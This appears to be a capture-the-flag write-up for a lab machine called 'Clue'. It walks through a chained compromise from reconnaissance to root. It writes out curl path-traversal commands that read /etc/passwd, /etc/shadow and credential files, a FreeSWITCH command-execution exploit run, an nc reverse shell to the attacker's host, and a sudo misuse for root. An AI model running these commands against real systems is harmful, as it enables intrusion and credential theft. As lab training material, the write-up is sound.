---
icon: ubuntu
---

# Clue - Hard

## Gaining Access

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.131.240 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 15:49 EDT
Nmap scan report for 192.168.131.240
Host is up (0.028s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-server-header: thin
|_http-title: Cassandra Web
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (95%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.15 (90%), OpenWrt 22.03 (Linux 5.10) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-09-22T19:51:51
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2025-09-22T15:51:47-04:00
|_clock-skew: mean: 1h20m12s, deviation: 2h18m34s, median: 12s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   26.70 ms 192.168.45.1
2   26.68 ms 192.168.45.254
3   28.80 ms 192.168.251.1
4   28.94 ms 192.168.131.240
```

### SMB Anonymous Access Enumeration

```
netexec smb 192.168.131.240 -u '' -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (1563).png" alt=""><figcaption></figcaption></figure>

We  have access to the backup of the cassandra and freeswitch application. I am going to download them to my attack machine and see if we can find any credentials or versions for the applications.

```
smbclient -N \\\\192.168.131.240\\backup
```

<figure><img src="../../.gitbook/assets/image (1564).png" alt=""><figcaption></figcaption></figure>

I looked at the directories for a bit and it looks like a rabbit hole. I am going to switch my focus to port 3000

### HTTP Port 3000 TCP (Cassandra Web)

<figure><img src="../../.gitbook/assets/image (1565).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1566).png" alt=""><figcaption></figcaption></figure>

We can execute queries, but before I dive into another rabbit hole. I'm going to look for any available exploits on Cassandra.

### Cassandra Web 0.5.0 Remore File Read

<figure><img src="../../.gitbook/assets/image (1567).png" alt=""><figcaption></figcaption></figure>

There is an RFI available for Cassandra, even though I do not know the version. I am going to take a look at it.

```
searchsploit -m 49362
```

<figure><img src="../../.gitbook/assets/image (1568).png" alt=""><figcaption></figcaption></figure>

The script performs directory traversal by adding dots and slashes to the url. I am going to try and perform it via a curl command:

```
curl --path-as-is http://192.168.131.240:3000/../../../../../../../../etc/passwd
```

<figure><img src="../../.gitbook/assets/image (1569).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1570).png" alt=""><figcaption></figcaption></figure>

It works! The exploit script reveals that credentials can be revealed by viewing `/proc/self/cmdline`, and it works!

```
curl --path-as-is http://192.168.131.240:3000/../../../../../../../../proc/self/cmdline --output -
```

<figure><img src="../../.gitbook/assets/image (1571).png" alt=""><figcaption></figcaption></figure>

Now we have cassie's password, but trying to login via ssh does not work, since I had RFI I checked the  `/etc/ssh/sshd_config` file and it confirmed that cassie does not have ssh access.

```
curl --path-as-is http://192.168.131.240:3000/../../../../../../../../etc/ssh/sshd_config
```

<figure><img src="../../.gitbook/assets/image (1572).png" alt=""><figcaption></figcaption></figure>

Usually Hard boxes like to combine Chain Exploitation, so as soon as I got cassie creds my mind shifted to port 8021 where FreeSwitch is located

### FreeSwitch 1.10.1 Command Execution

<figure><img src="../../.gitbook/assets/image (1573).png" alt=""><figcaption></figcaption></figure>

Command Execution sounds perfect, even though I do not have access to a version I am going to download the exploit script and take a look at it:

```
searchsploit -m 47799
```

The script requires a password for command execution:

<figure><img src="../../.gitbook/assets/image (1574).png" alt=""><figcaption></figcaption></figure>

Searching for a config file for freeswitch, comes up as the first search:

<figure><img src="../../.gitbook/assets/image (1575).png" alt=""><figcaption></figcaption></figure>

Let's take a look at this file the file remote file read we found on cassandra:

```
curl --path-as-is http://192.168.131.240:3000/../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml
```

<figure><img src="../../.gitbook/assets/image (1576).png" alt=""><figcaption></figcaption></figure>

Now that I have the password I am going to update the script and try running it:

<figure><img src="../../.gitbook/assets/image (1577).png" alt=""><figcaption></figcaption></figure>

Save the txt file as 47799.py and run it:

```
python3 47799.py 192.168.131.240 'id && which nc'
```

<figure><img src="../../.gitbook/assets/image (1578).png" alt=""><figcaption></figcaption></figure>

it works and nc is on the box let's get a reverse shell!:

```
python3 47799.py 192.168.131.240 '/usr/bin/nc 192.168.45.158 80 -e /bin/bash'
```

<figure><img src="../../.gitbook/assets/image (1579).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1580).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We have cassie credentials from earlier so I am going to switch users:

<figure><img src="../../.gitbook/assets/image (1581).png" alt=""><figcaption></figcaption></figure>

### sudo Cassandra-Web Privesc

<figure><img src="../../.gitbook/assets/image (1582).png" alt=""><figcaption></figcaption></figure>

cassie can run `cassandra-web` as root without a password

<figure><img src="../../.gitbook/assets/image (1583).png" alt=""><figcaption></figcaption></figure>

I can run another vulnerable `Cassandra` server. And I'll be able to view all the files on the machine

```
sudo cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330
```

<figure><img src="../../.gitbook/assets/image (1584).png" alt=""><figcaption></figcaption></figure>

I am going to get another shell on the box \[**same as earlier via freeswitch**] to interact with the vulnerable cassandra server I just started, and try to see if I can read the /etc/shadow file

```
curl --path-as-is http://0.0.0.0:4444/../../../../../../../../etc/shadow
```

<figure><img src="../../.gitbook/assets/image (1585).png" alt=""><figcaption></figcaption></figure>

It works! I tried cracking root's and anthony's hashes but it did not work. I was able to read his ssh key though!

<figure><img src="../../.gitbook/assets/image (1586).png" alt=""><figcaption></figcaption></figure>

I am going to use his ssh key and ssh as anthony, we know from earlier he can ssh!

<figure><img src="../../.gitbook/assets/image (1587).png" alt=""><figcaption></figcaption></figure>

That is weird, it is asking for a password. I checked anthony's bash history and found something interesting: the root user has an authorized key corresponding to Anthony's private key:

```
curl --path-as-is http://0.0.0.0:4444/../../../../../../../../home/anthony/.bash_history
```

<figure><img src="../../.gitbook/assets/image (1588).png" alt=""><figcaption></figcaption></figure>

Which means we can use the key we got earlier to ssh as root!

<figure><img src="../../.gitbook/assets/image (1589).png" alt=""><figcaption></figcaption></figure>

We got root!!!

### Looking for local and proof files:

If you can't find the local.txt file use the below command

```
find / -iname local.txt -type f 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (1590).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1591).png" alt=""><figcaption></figcaption></figure>
